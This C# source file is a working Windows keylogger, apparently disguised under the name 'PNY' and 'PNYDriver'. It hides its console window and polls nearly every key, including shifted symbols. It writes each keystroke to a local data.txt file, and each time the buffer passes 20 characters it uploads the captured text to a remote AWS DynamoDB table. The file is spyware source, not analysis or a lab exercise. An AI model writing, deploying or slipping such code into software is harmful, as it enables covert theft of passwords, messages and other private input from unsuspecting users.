using System;
using System.Runtime.InteropServices;
using System.Windows.Input;
using System.Threading;
using System.IO;
using Amazon.DynamoDBv2;
using Amazon.DynamoDBv2.DocumentModel;


namespace PNY
{
    class Program
    {

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;

        static void Main(string[] args)
        {

            
            IntPtr handle = GetConsoleWindow();

            //// Hide
            ShowWindow(handle, SW_HIDE);


            Thread t = new Thread(Keyboarder);
            t.SetApartmentState(ApartmentState.STA);

            t.Start();

            
        }

        

        public static void Keyboarder()
        {

            AmazonDynamoDBClient client = new AmazonDynamoDBClient();
            const string tableName = "Text";

            Table text = Table.LoadTable(client, tableName);

            StreamWriter file = new StreamWriter(Directory.GetCurrentDirectory() + "\\data.txt", true)
            {
                AutoFlush = true
            };

            var output = "";

            while (true)
            {
                if (Keyboard.IsKeyDown(Key.Enter))
                {
                    file.Write("\n\r");
                    output += "\n\r";
                    while (Keyboard.IsKeyDown(Key.Enter)) { }
                }

                if (Keyboard.IsKeyDown(Key.Back))
                {
                    file.Write("{BACKSPACE}");
                    output += "{BACKSPACE}";
                    while (Keyboard.IsKeyDown(Key.Back)) { }
                }

                if (Keyboard.IsKeyDown(Key.OemPipe) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("|");
                    output += "|";
                    while (Keyboard.IsKeyDown(Key.OemPipe)) {}
                }

                else if (Keyboard.IsKeyDown(Key.OemPipe))
                {
                    file.Write("\\");
                    output += "\\";
                    while (Keyboard.IsKeyDown(Key.OemPipe)) {}
                }

                if (Keyboard.IsKeyDown(Key.Space))
                {
                    file.Write(" ");
                    output += " ";
                    while (Keyboard.IsKeyDown(Key.Space)) {}
                }

                if (Keyboard.IsKeyDown(Key.D1) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("!");
                    output += "!";
                    while (Keyboard.IsKeyDown(Key.D1)) {}
                }

                else if (Keyboard.IsKeyDown(Key.D1))
                {
                    file.Write("1");
                    output += "1";
                    while (Keyboard.IsKeyDown(Key.D1)) {}
                }

                if (Keyboard.IsKeyDown(Key.D2) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("@");
                    output += "@";
                    while (Keyboard.IsKeyDown(Key.D2)) {}
                }

                else if (Keyboard.IsKeyDown(Key.D2))
                {
                    file.Write("2");
                    output += "2";
                    while (Keyboard.IsKeyDown(Key.D2)) {}
                }

                if (Keyboard.IsKeyDown(Key.D3) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("#");
                    output += "#";
                    while (Keyboard.IsKeyDown(Key.D3)) {}
                }

                else if (Keyboard.IsKeyDown(Key.D3))
                {
                    file.Write("3");
                    output += "3";
                    while (Keyboard.IsKeyDown(Key.D3)) {}
                }

                if (Keyboard.IsKeyDown(Key.D4) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("$");
                    output += "$";
                    while (Keyboard.IsKeyDown(Key.D4)) {}
                }

                else if (Keyboard.IsKeyDown(Key.D4))
                {
                    file.Write("4");
                    output += "4";
                    while (Keyboard.IsKeyDown(Key.D4)) {}
                }

                if (Keyboard.IsKeyDown(Key.D5) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("%");
                    output += "%";
                    while (Keyboard.IsKeyDown(Key.D5)) {}
                }

                else if (Keyboard.IsKeyDown(Key.D5))
                {
                    file.Write("5");
                    output += "5";
                    while (Keyboard.IsKeyDown(Key.D5)) {}
                }

                if (Keyboard.IsKeyDown(Key.D6) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("^");
                    output += "^";
                    while (Keyboard.IsKeyDown(Key.D6)) {}
                }

                else if (Keyboard.IsKeyDown(Key.D6))
                {
                    file.Write("6");
                    output += "6";
                    while (Keyboard.IsKeyDown(Key.D6)) {}
                }

                if (Keyboard.IsKeyDown(Key.D7) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("&");
                    output += "&";
                    while (Keyboard.IsKeyDown(Key.D7)) {}
                }

                else if (Keyboard.IsKeyDown(Key.D7))
                {
                    file.Write("7");
                    output += "7";
                    while (Keyboard.IsKeyDown(Key.D7)) {}
                }

                if (Keyboard.IsKeyDown(Key.D8) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("*");
                    output += "*";
                    while (Keyboard.IsKeyDown(Key.D8)) {}
                }

                else if (Keyboard.IsKeyDown(Key.D8))
                {
                    file.Write("8");
                    output += "8";
                    while (Keyboard.IsKeyDown(Key.D8)) {}
                }

                if (Keyboard.IsKeyDown(Key.D9) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("(");
                    output += "(";
                    while (Keyboard.IsKeyDown(Key.D9)) {}
                }

                else if (Keyboard.IsKeyDown(Key.D9))
                {
                    file.Write("9");
                    output += "9";
                    while (Keyboard.IsKeyDown(Key.D9)) {}
                }

                if (Keyboard.IsKeyDown(Key.D0) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write(")");
                    output += ")";
                    while (Keyboard.IsKeyDown(Key.D0)) {}
                }

                else if (Keyboard.IsKeyDown(Key.D0))
                {
                    file.Write("0");
                    output += "0";
                    while (Keyboard.IsKeyDown(Key.D0)) {}
                }

                if (Keyboard.IsKeyDown(Key.OemComma) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("<");
                    output += "<";
                    while (Keyboard.IsKeyDown(Key.OemComma)) {}
                }

                else if (Keyboard.IsKeyDown(Key.OemComma))
                {
                    file.Write(",");
                    output += ",";
                    while (Keyboard.IsKeyDown(Key.OemComma)) {}
                }

                if (Keyboard.IsKeyDown(Key.OemPeriod) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write(">");
                    output += ">";
                    while (Keyboard.IsKeyDown(Key.OemPeriod)) {}
                }

                else if (Keyboard.IsKeyDown(Key.OemPeriod))
                {
                    file.Write(".");
                    output += ".";
                    while (Keyboard.IsKeyDown(Key.OemPeriod)) {}
                }

                if (Keyboard.IsKeyDown(Key.OemQuestion) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("?");
                    output += "?";
                    while (Keyboard.IsKeyDown(Key.OemQuestion)) {}
                }

                else if (Keyboard.IsKeyDown(Key.OemQuestion))
                {
                    file.Write("/");
                    output += "/";
                    while (Keyboard.IsKeyDown(Key.OemQuestion)) {}
                }

                if (Keyboard.IsKeyDown(Key.OemSemicolon) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write(":");
                    output += ":";
                    while (Keyboard.IsKeyDown(Key.OemSemicolon)) {}
                }

                else if (Keyboard.IsKeyDown(Key.OemSemicolon))
                {
                    file.Write(";");
                    output += ";";
                    while (Keyboard.IsKeyDown(Key.OemSemicolon)) {}
                }

                if (Keyboard.IsKeyDown(Key.OemQuotes) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("\"");
                    output += "\"";
                    while (Keyboard.IsKeyDown(Key.OemQuotes)) {}
                }

                else if (Keyboard.IsKeyDown(Key.OemQuotes))
                {
                    file.Write("\'");
                    output += "\'";
                    while (Keyboard.IsKeyDown(Key.OemQuotes)) {}
                }

                if (Keyboard.IsKeyDown(Key.OemOpenBrackets) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("{");
                    output += "{";
                    while (Keyboard.IsKeyDown(Key.OemOpenBrackets)) {}
                }

                else if (Keyboard.IsKeyDown(Key.OemOpenBrackets))
                {
                    file.Write("[");
                    output += "[";
                    while (Keyboard.IsKeyDown(Key.OemOpenBrackets)) {}
                }

                if (Keyboard.IsKeyDown(Key.OemCloseBrackets) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("}");
                    output += "}";
                    while (Keyboard.IsKeyDown(Key.OemCloseBrackets)) {}
                }

                else if (Keyboard.IsKeyDown(Key.OemCloseBrackets))
                {
                    file.Write("]");
                    output += "]";
                    while (Keyboard.IsKeyDown(Key.OemCloseBrackets)) {}
                }

                if (Keyboard.IsKeyDown(Key.OemTilde) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("~");
                    output += "~";
                    while (Keyboard.IsKeyDown(Key.OemTilde)) {}
                }

                else if (Keyboard.IsKeyDown(Key.OemTilde))
                {
                    file.Write("`");
                    output += "`";
                    while (Keyboard.IsKeyDown(Key.OemTilde)) {}
                }

                if (Keyboard.IsKeyDown(Key.CapsLock) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("{CAPSLOCK}");
                    output += "{CAPSLOCK}";
                    while (Keyboard.IsKeyDown(Key.CapsLock)) {}
                }

                if (Keyboard.IsKeyDown(Key.NumPad0))
                {
                    file.Write("0");
                    output += "0";
                    while (Keyboard.IsKeyDown(Key.NumPad0)) {}
                }

                if (Keyboard.IsKeyDown(Key.NumPad1))
                {
                    file.Write("1");
                    output += "1";
                    while (Keyboard.IsKeyDown(Key.NumPad1)) {}
                }

                if (Keyboard.IsKeyDown(Key.NumPad2))
                {
                    file.Write("2");
                    output += "2";
                    while (Keyboard.IsKeyDown(Key.NumPad2)) {}
                }

                if (Keyboard.IsKeyDown(Key.NumPad3))
                {
                    file.Write("3");
                    output += "3";
                    while (Keyboard.IsKeyDown(Key.NumPad3)) {}
                }

                if (Keyboard.IsKeyDown(Key.NumPad4))
                {
                    file.Write("4");
                    output += "4";
                    while (Keyboard.IsKeyDown(Key.NumPad4)) {}
                }

                if (Keyboard.IsKeyDown(Key.NumPad5))
                {
                    file.Write("5");
                    output += "5";
                    while (Keyboard.IsKeyDown(Key.NumPad5)) {}
                }

                if (Keyboard.IsKeyDown(Key.NumPad6))
                {
                    file.Write("6");
                    output += "6";
                    while (Keyboard.IsKeyDown(Key.NumPad6)) {}
                }

                if (Keyboard.IsKeyDown(Key.NumPad7))
                {
                    file.Write("7");
                    output += "7";
                    while (Keyboard.IsKeyDown(Key.NumPad7)) {}
                }

                if (Keyboard.IsKeyDown(Key.NumPad8))
                {
                    file.Write("8");
                    output += "8";
                    while (Keyboard.IsKeyDown(Key.NumPad8)) {}
                }

                if (Keyboard.IsKeyDown(Key.NumPad9))
                {
                    file.Write("9");
                    output += "9";
                    while (Keyboard.IsKeyDown(Key.NumPad9)) {}
                }

                if (Keyboard.IsKeyDown(Key.OemMinus) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("_");
                    output += "_";
                    while (Keyboard.IsKeyDown(Key.OemMinus)) {}
                }

                else if (Keyboard.IsKeyDown(Key.OemMinus))
                {
                    file.Write("-");
                    output += "-";
                    while (Keyboard.IsKeyDown(Key.OemMinus)) {}
                }

                if (Keyboard.IsKeyDown(Key.OemPlus) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("+");
                    output += "+";
                    while (Keyboard.IsKeyDown(Key.OemPlus)) {}
                }

                else if (Keyboard.IsKeyDown(Key.OemPlus))
                {
                    file.Write("=");
                    output += "=";
                    while (Keyboard.IsKeyDown(Key.OemPlus)) {}
                }

                if (Keyboard.IsKeyDown(Key.A) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("A");
                    output += "A";
                    while (Keyboard.IsKeyDown(Key.A)) {}
                }

                else if (Keyboard.IsKeyDown(Key.A))
                {
                    file.Write("a");
                    output += "a";
                    while (Keyboard.IsKeyDown(Key.A)) {}
                }

                if (Keyboard.IsKeyDown(Key.B) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("B");
                    output += "B";
                    while (Keyboard.IsKeyDown(Key.B)) {}
                }

                else if (Keyboard.IsKeyDown(Key.B))
                {
                    file.Write("b");
                    output += "b";
                    while (Keyboard.IsKeyDown(Key.B)) {}
                }

                if (Keyboard.IsKeyDown(Key.C) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("C");
                    output += "C";
                    while (Keyboard.IsKeyDown(Key.C)) {}
                }

                else if (Keyboard.IsKeyDown(Key.C))
                {
                    file.Write("c");
                    output += "c";
                    while (Keyboard.IsKeyDown(Key.C)) {}
                }

                if (Keyboard.IsKeyDown(Key.D) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("D");
                    output += "D";
                    while (Keyboard.IsKeyDown(Key.D)) {}
                }

                else if (Keyboard.IsKeyDown(Key.D))
                {
                    file.Write("d");
                    output += "d";
                    while (Keyboard.IsKeyDown(Key.D)) {}
                }

                if (Keyboard.IsKeyDown(Key.E) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("E");
                    output += "E";
                    while (Keyboard.IsKeyDown(Key.E)) {}
                }

                else if (Keyboard.IsKeyDown(Key.E))
                {
                    file.Write("e");
                    output += "e";
                    while (Keyboard.IsKeyDown(Key.E)) {}
                }

                if (Keyboard.IsKeyDown(Key.F) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("F");
                    output += "F";
                    while (Keyboard.IsKeyDown(Key.F)) {}
                }

                else if (Keyboard.IsKeyDown(Key.F))
                {
                    file.Write("f");
                    output += "f";
                    while (Keyboard.IsKeyDown(Key.F)) {}
                }

                if (Keyboard.IsKeyDown(Key.G) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("G");
                    output += "G";
                    while (Keyboard.IsKeyDown(Key.G)) {}
                }

                else if (Keyboard.IsKeyDown(Key.G))
                {
                    file.Write("g");
                    output += "g";
                    while (Keyboard.IsKeyDown(Key.G)) {}
                }

                if (Keyboard.IsKeyDown(Key.H) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("H");
                    output += "H";
                    while (Keyboard.IsKeyDown(Key.H)) {}
                }

                else if (Keyboard.IsKeyDown(Key.H))
                {
                    file.Write("h");
                    output += "h";
                    while (Keyboard.IsKeyDown(Key.H)) {}
                }

                if (Keyboard.IsKeyDown(Key.I) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("I");
                    output += "I";
                    while (Keyboard.IsKeyDown(Key.I)) {}
                }

                else if (Keyboard.IsKeyDown(Key.I))
                {
                    file.Write("i");
                    output += "i";
                    while (Keyboard.IsKeyDown(Key.I)) {}
                }

                if (Keyboard.IsKeyDown(Key.J) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("J");
                    output += "J";
                    while (Keyboard.IsKeyDown(Key.J)) {}
                }

                else if (Keyboard.IsKeyDown(Key.J))
                {
                    file.Write("j");
                    output += "j";
                    while (Keyboard.IsKeyDown(Key.J)) {}
                }

                if (Keyboard.IsKeyDown(Key.K) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("K");
                    output += "K";
                    while (Keyboard.IsKeyDown(Key.K)) {}
                }

                else if (Keyboard.IsKeyDown(Key.K))
                {
                    file.Write("k");
                    output += "k";
                    while (Keyboard.IsKeyDown(Key.K)) {}
                }

                if (Keyboard.IsKeyDown(Key.L) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("L");
                    output += "L";
                    while (Keyboard.IsKeyDown(Key.L)) {}
                }

                else if (Keyboard.IsKeyDown(Key.L))
                {
                    file.Write("l");
                    output += "l";
                    while (Keyboard.IsKeyDown(Key.L)) {}
                }

                if (Keyboard.IsKeyDown(Key.M) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("M");
                    output += "M";
                    while (Keyboard.IsKeyDown(Key.M)) {}
                }

                else if (Keyboard.IsKeyDown(Key.M))
                {
                    file.Write("m");
                    output += "m";
                    while (Keyboard.IsKeyDown(Key.M)) {}
                }

                if (Keyboard.IsKeyDown(Key.N) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("N");
                    output += "N";
                    while (Keyboard.IsKeyDown(Key.N)) {}
                }

                else if (Keyboard.IsKeyDown(Key.N))
                {
                    file.Write("n");
                    output += "n";
                    while (Keyboard.IsKeyDown(Key.N)) {}
                }

                if (Keyboard.IsKeyDown(Key.O) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("O");
                    output += "O";
                    while (Keyboard.IsKeyDown(Key.O)) {}
                }

                else if (Keyboard.IsKeyDown(Key.O))
                {
                    file.Write("o");
                    output += "o";
                    while (Keyboard.IsKeyDown(Key.O)) {}
                }

                if (Keyboard.IsKeyDown(Key.P) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("P");
                    output += "P";
                    while (Keyboard.IsKeyDown(Key.P)) {}
                }

                else if (Keyboard.IsKeyDown(Key.P))
                {
                    file.Write("p");
                    output += "p";
                    while (Keyboard.IsKeyDown(Key.P)) {}
                }

                if (Keyboard.IsKeyDown(Key.Q) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("Q");
                    output += "Q";
                    while (Keyboard.IsKeyDown(Key.Q)) {}
                }

                else if (Keyboard.IsKeyDown(Key.Q))
                {
                    file.Write("q");
                    output += "q";
                    while (Keyboard.IsKeyDown(Key.Q)) {}
                }

                if (Keyboard.IsKeyDown(Key.R) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("R");
                    output += "R";
                    while (Keyboard.IsKeyDown(Key.R)) {}
                }

                else if (Keyboard.IsKeyDown(Key.R))
                {
                    file.Write("r");
                    output += "r";
                    while (Keyboard.IsKeyDown(Key.R)) {}
                }

                if (Keyboard.IsKeyDown(Key.S) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("S");
                    output += "S";
                    while (Keyboard.IsKeyDown(Key.S)) {}
                }

                else if (Keyboard.IsKeyDown(Key.S))
                {
                    file.Write("s");
                    output += "s";
                    while (Keyboard.IsKeyDown(Key.S)) {}
                }

                if (Keyboard.IsKeyDown(Key.T) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("T");
                    output += "T";
                    while (Keyboard.IsKeyDown(Key.T)) {}
                }

                else if (Keyboard.IsKeyDown(Key.T))
                {
                    file.Write("t");
                    output += "t";
                    while (Keyboard.IsKeyDown(Key.T)) {}
                }

                if (Keyboard.IsKeyDown(Key.U) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("U");
                    output += "U";
                    while (Keyboard.IsKeyDown(Key.U)) {}
                }

                else if (Keyboard.IsKeyDown(Key.U))
                {
                    file.Write("u");
                    output += "u";
                    while (Keyboard.IsKeyDown(Key.U)) {}
                }

                if (Keyboard.IsKeyDown(Key.V) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("V");
                    output += "V";
                    while (Keyboard.IsKeyDown(Key.V)) {}
                }

                else if (Keyboard.IsKeyDown(Key.V))
                {
                    file.Write("v");
                    output += "v";
                    while (Keyboard.IsKeyDown(Key.V)) {}
                }

                if (Keyboard.IsKeyDown(Key.W) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("W");
                    output += "W";
                    while (Keyboard.IsKeyDown(Key.W)) {}
                }

                else if (Keyboard.IsKeyDown(Key.W))
                {
                    file.Write("w");
                    output += "w";
                    while (Keyboard.IsKeyDown(Key.W)) {}
                }

                if (Keyboard.IsKeyDown(Key.X) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("X");
                    output += "X";
                    while (Keyboard.IsKeyDown(Key.X)) {}
                }

                else if (Keyboard.IsKeyDown(Key.X))
                {
                    file.Write("x");
                    output += "x";
                    while (Keyboard.IsKeyDown(Key.X)) {}
                }

                if (Keyboard.IsKeyDown(Key.Y) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("Y");
                    output += "Y";
                    while (Keyboard.IsKeyDown(Key.Y)) {}
                }

                else if (Keyboard.IsKeyDown(Key.Y))
                {
                    file.Write("y");
                    output += "y";
                    while (Keyboard.IsKeyDown(Key.Y)) {}
                }

                if (Keyboard.IsKeyDown(Key.Z) && (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)))
                {
                    file.Write("Z");
                    output += "Z";
                    while (Keyboard.IsKeyDown(Key.Z)) {}
                }

                else if (Keyboard.IsKeyDown(Key.Z))
                {
                    file.Write("z");
                    output += "z";
                    while (Keyboard.IsKeyDown(Key.Z)) {}
                }

                if (output.Length <= 20) continue;
                Document doc = new Document
                {
                    ["PNYDriver"] = "Log",
                    ["Time"] = DateTime.Now,
                    ["Text"] = output
                };
                text.PutItem(doc);
                output = "";
            }
        }
    }
}
